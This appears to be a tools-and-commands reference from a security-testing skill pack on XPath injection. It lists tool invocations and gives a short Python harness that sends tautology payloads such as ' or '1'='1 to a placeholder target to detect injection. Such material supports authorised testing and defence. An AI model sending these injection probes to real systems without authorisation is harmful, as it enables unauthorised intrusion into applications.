# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ldap-and-xpath-injection-xpath`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `xmllint` | `xmllint --xpath "//user[name/text()='testuser']" users.xml` | Capture the baseline node-set a predicate differential is compared against | Linux, macOS, Windows |
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{size_download}\n' 'https://target.example/find?name=testuser'` | Record the status and size baseline before sending a tautology probe | Cross-platform |
| `python-lxml` | `python -c "from lxml import etree; print(etree.XML(b'<r/>').xpath('count(/*)'))"` | Prototype count() and substring() oracle expressions locally before using them on the target | Cross-platform |
| `Semgrep` | `semgrep -e '$T.xpath("..." % ...)' --lang python .` | Flag XPath expressions assembled with string formatting instead of bound variables | Cross-platform |

## Minimal Script Shape

A tautology-differential harness for an XML-backed lookup: it compares a true predicate against a false one and flags a likely XPath injection only when the two diverge from the literal baseline.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/find"

def query(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status, len(r.read())

control = query("realuser")
true_probe = query("' or '1'='1")
false_probe = query("' or '1'='2")
print({"control": control, "true": true_probe, "false": false_probe,
       "xpath_injection_suspected":
       true_probe[1] != false_probe[1] and true_probe[0] == 200})
```
